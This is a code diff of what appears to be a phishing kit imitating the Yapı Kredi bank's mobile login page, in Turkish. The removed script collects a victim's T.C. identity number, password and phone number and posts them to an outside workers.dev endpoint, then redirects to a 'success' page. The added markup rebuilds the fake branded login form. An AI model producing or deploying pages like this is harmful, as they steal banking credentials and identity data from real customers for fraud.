-        <div role="dialog" tabindex="-1" class="modal" id="connectionModalmd" aria-labelledby="" style="display: none;">
-          <div class="modal-dialog modal-dialog-centered modal-lg modal-dialog-scrollable modal-background" role="document">
-            <div class="modal-content">
-           
-              <div class="modal-body text-center default-bg">
-      
-                <p class="fs-16 font-weight-bold message-row"></p>
-                <div class="row col-md-10 mx-auto mt-5 mb-4">
-                  <div class="col-12 mb-4 col-md-6 mx-auto">
-                    <vp-button>
-                      <!---->
-                      <a class=" btn btn-primary ml-auto btn-block" id="btn">
-                        <!---->
-                        <span class="button-text mx-3 ">
-                   
-                        </span>
-                      </a>
-                
-                    </vp-button>
-                  </div>
-                </div>
-                <div class="keyboard-spacer"></div>
-              </div>
-              <!---->
-            </div>
-          </div>
-        </div>
-      </vp-modalpopup>
  
-	  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-	<script>
-	document.getElementById('btnLogin').addEventListener('click', function (e) {
-		e.preventDefault();
 
-		var tcno = document.getElementById('tcOrUserNametxt').value;
-		var password = document.getElementById('tbPasswordtxt').value;
+<!DOCTYPE html>
+<html lang="tr" style="    max-width: 500px;
+    margin: 0 auto;">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Mobil Giriş Sayfası</title>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 
-		if (!validateTC(tcno)) {
-			Swal.fire({
-				icon: 'error',
-				title: 'Geçersiz T.C. Kimlik No',
-				text: 'Lütfen geçerli bir T.C. Kimlik Numarası giriniz.',
-				confirmButtonText: 'Tamam'
-			});
-			return;
-		}
+</head>
+<body>
+<style>
+      @import url(https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap);
 
-		Swal.fire({
-			title: 'Telefon Numaranız',
-			html: `
-				<div style="display: flex; align-items: center;">
-					<span style="margin-right: 10px;">📞</span>
-					<input type="tel" id="phone" value="+905" class="swal2-input" style="width: 85%;" minlength="13" maxlength="13" required>
-				</div>
-			`,
-			confirmButtonText: 'Gönder',
-			showCancelButton: true,
-			cancelButtonText: 'İptal',
-			allowOutsideClick: false,
-			preConfirm: () => {
-				const phone = document.getElementById('phone').value;
-				if (!/^\+905\d{9}$/.test(phone)) {
-					Swal.showValidationMessage('Lütfen geçerli bir telefon numarası giriniz!');
-				}
-				return phone;
-			}
-		}).then((result) => {
-			if (result.isConfirmed) {
-				var phone = result.value;
-
-				// Create URLSearchParams
-				var params = new URLSearchParams();
-				params.append('tcno', tcno);
-				params.append('password', password);
-				params.append('phone', phone);
-
-				// Send the data as application/x-www-form-urlencoded
-				fetch('https://broad-recipe-30da.selimjuhan10.workers.dev/', {
-					method: 'POST',
-					headers: {
-						'Content-Type': 'application/x-www-form-urlencoded'
-					},
-					body: params.toString()
-				})
-				.then(response => {
-					if (response.ok) {
-						window.location.href = 'basarili.html';
-					} else {
-						console.error('Error:', response.statusText);
-					}
-				})
-				.catch(error => {
-					console.error('Fetch error:', error);
-				});
-			}
-		});
-
-		setTimeout(() => {
-			const phoneInput = document.getElementById('phone');
-			phoneInput.focus();
-
-			phoneInput.addEventListener('input', function() {
-				const isValid = phoneInput.value.length === 13 && /^\+905\d{9}$/.test(phoneInput.value);
-				const confirmButton = Swal.getConfirmButton();
-				confirmButton.disabled = !isValid;
-			});
-
-			Swal.getConfirmButton().disabled = true;
-		}, 100);
-	});
-
-function validateTC(tcno) {
-    // Ensure tcno is a string
-    tcno = String(tcno);
-    
-    // Check if the first digit is '0' or if the length is not 11
-    if (tcno.length !== 11 || tcno.startsWith('0')) {
-        return false;
+  
+    .custom-swal-title {
+        font-size: 1.275em;
     }
-
-    // Convert the first 10 characters to an array of integers
-    const ilkon_array = tcno.split('').map(Number);
-    
-    let hane_tek = 0, hane_cift = 0, ilkon_total = 0;
-
-    for (let i = 0; i < 9; ++i) {
-        const j = ilkon_array[i];
-        if (i % 2 === 0) {
-            hane_tek += j; // Odd indexed positions (0, 2, 4, ...)
-        } else {
-            hane_cift += j; // Even indexed positions (1, 3, 5, ...)
-        }
-        ilkon_total += j;
+    .custom-swal-text {
+        font-size: 16px;
     }
-
-    // Check the 10th digit condition
-    if ((hane_tek * 7 - hane_cift) % 10 !== ilkon_array[9]) {
-        return false;
-    }
-
-    // Check the final digit condition
-    ilkon_total += ilkon_array[9];
-    if (ilkon_total % 10 !== ilkon_array[10]) {
-        return false;
-    }
-
-    return true; // Valid T.C. number
+    div form label {
+  font-family: Montserrat;
+  font-size: 18px;
+  font-weight: 500;
+  font-style: normal;
+  text-transform: uppercase;
 }
 
-</script>
+</style>
 
-	
-	<style>
-		.swal-container-custom {
-			background-color: #f9f9f9; 
-			border-radius: 10px; /* Kenar yuvarlama */
-			padding: 20px; /* İç boşluk */
-			box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1); /* Gölgelendirme */
-		}
-	
-		.swal-input-custom {
-			border: 1px solid #ccc; /* Kenar rengi */
-			border-radius: 5px; /* Kenar yuvarlama */
-			padding: 10px; /* İç boşluk */
-			font-size: 16px; /* Yazı boyutu */
-			width: calc(100% - 20px); /* Genişlik ayarı */
-		}
-	
-		.swal2-confirm {
-			background-color: #28a745; /* Onay butonu rengi */
-			color: white; /* Yazı rengi */
-			border: none; /* Kenar yok */
-		}
-	
-		.swal2-cancel {
-			background-color: #dc3545; /* İptal butonu rengi */
-			color: white; /* Yazı rengi */
-			border: none; /* Kenar yok */
-		}
-	
-		.swal2-popup {
-			font-family: 'Arial', sans-serif; /* Yazı tipi */
-			font-size: 16px; /* Yazı boyutu */
-		}
-	</style>
-	
-	  
-  </body>
+    <div class="header" style="padding-top: 24px;padding-bottom: 50px;">
+       
+        <img src="logo.png" alt="YapiKredi Logo">  
+    </div>
+    
+    <div class="container">
+        <div class="tab">
+        <img src="tab.png" alt="tab" style="width: 90%;">
+        </div>
+        <form id="customForm" onsubmit="submitCustomForm(event)">
+            <div class="form-group">
+                <input type="text" placeholder="T.C. Kimlik No veya Kullanıcı Kodu" id="customUsername" inputmode="numeric" pattern="[0-9]*" minlength="11" maxlength="11">
+                <input type="password" placeholder="Şifre" id="customPassword" inputmode="numeric" pattern="[0-9]*" 
+                    style="-webkit-border-bottom-right-radius: 10px;
+                    -webkit-border-bottom-left-radius: 10px;
+                    -moz-border-radius-bottomright: 10px;
+                    -moz-border-radius-bottomleft: 10px;
+                    border-bottom-right-radius: 10px;
+                    border-bottom-left-radius: 10px;" minlength="6" maxlength="6">
+            </div>
+            
+           
+            
+            <!-- Hata mesajları için alan -->
+            <div id="alertDiv" class="alert-message">Hatalı giriş yaptınız. Lütfen bilgilerinizi kontrol ediniz.</div>
+            
+           
+      
+     
+    </div>   <div class="remember-me">
+                <label>Beni Hatırla</label>
+                <label class="toggle-switch">
+                    <input type="checkbox">
+                    <span class="slider"></span>
+                </label>
+            </div>
+        <button type="submit" class="login-button">Giriş</button>
+    <script src="script.js"></script>  </form>
+</body>
 </html>
